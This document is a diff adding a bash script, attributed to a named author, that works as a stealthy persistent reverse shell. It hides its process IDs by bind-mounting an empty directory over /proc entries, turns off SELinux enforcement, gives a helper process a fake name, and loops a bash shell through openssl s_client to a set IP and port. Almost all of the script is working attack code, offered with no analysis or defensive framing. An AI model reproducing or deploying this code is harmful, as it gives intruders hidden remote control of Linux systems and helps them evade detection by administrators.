@@ -1,0 +1,93 @@
+#!/bin/bash 
+# Created by James Rivers
+# https://jamesrivers.tech/
+
+mtab() { 
+    # 1. Ensure mtab isn't a symlink to prevent mount logging
+    [[ -L /etc/mtab ]] && { command cp /etc/mtab /etc/mtab.bak; command mv /etc/mtab.bak /etc/mtab; } 
+    
+    # source of the bind mount
+    local _mask="/dev/shm/.mask"
+    if [ ! -d "$_mask" ]; then
+        command mkdir -p "$_mask"
+        command chmod 555 "$_mask"
+    fi
+
+    _pid=${1:-$$} 
+    
+    # 3. If a PID is passed, hide it using the masked directory
+    if [[ $_pid =~ ^[0-9]+$ ]]; then 
+        command mount -n --bind "$_mask" "/proc/$_pid" 2>/dev/null
+        return
+    fi 
+
+    # 4. Handle running a new command under a hidden PID
+    local _argstr 
+    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done 
+    
+    bash -c "command mount -n --bind '$_mask' /proc/\$\$; exec \"$1\" $_argstr" 
+}
+export -f mtab
+cleanup() { 
+    # Kill background jobs
+    local pids=$(jobs -p) 
+    [[ -n "$pids" ]] && kill $pids 2>/dev/null 
+
+    # Clean all shm mounts from /proc
+    grep "/dev/shm" /proc/mounts | cut -d' ' -f2 | xargs -r umount -l 2>/dev/null 
+    rm -rf "/dev/shm/.*"
+    rm -rf "/dev/shm/.mask/"
+    [[ -f /etc/mtab.bak ]] && mv /etc/mtab.bak /etc/mtab 
+    mount -o remount,hidepid=0 /proc 2>/dev/null 
+    exit 0 
+}
+ssleep() { 
+    local fake_name="/bin/$(ls /sbin | shuf -n 1)" 
+    local duration=$(shuf -i 5-10 -n 1) # wait between 30 and 45 seconds 
+    (exec -a "$fake_name" sleep "$duration") & 
+    local sleep_pid=$! 
+    
+    # Hide it
+    mtab "$sleep_pid" 
+    
+    # Wait for it to finish
+    wait "$sleep_pid" 2>/dev/null
+    
+    # clean up immediately
+    umount -l /proc/"$sleep_pid" 2>/dev/null 
+} 
+
+# START 
+# is Selinux stoping us from mounting to /dev/shm?
+command getenforce &>/dev/null && (getenforce | grep -q "Enforcing") && setenforce 0 #|| echo "NO setenforce needed" 
+
+### startup.sh ###
+
+IP="127.0.0.1"  
+PORT="4316" 
+
+trap cleanup EXIT SIGINT SIGTERM SIGHUP SIGTSTP
+
+mtab     # hide current script pid  
+
+# MAIN 
+while true; do 
+        mtab 
+        #FAKE_NAME="[BRUH--kworker/u$(shuf -i 0-5 -n 1):$(shuf -i 0-5 -n 1)]" 
+        #ETH=$(ip route get 1 | awk '{print $7;exit}' 2>/dev/null)
+
+        PIPE="/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
+        mkfifo "$PIPE"
+
+        ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect $IP:$PORT > $PIPE ) &
+        pid=$!
+        pids="$pid $(pgrep -P $pid)"
+        for i in $pids;do mtab $i;done
+        wait "$pid"
+
+        rm -f "$PIPE"
+        umount -l /proc/$$ 2>/dev/null
+
+        # This function handles its own mounting and unmounting
+        ssleep  
+done &>/dev/null
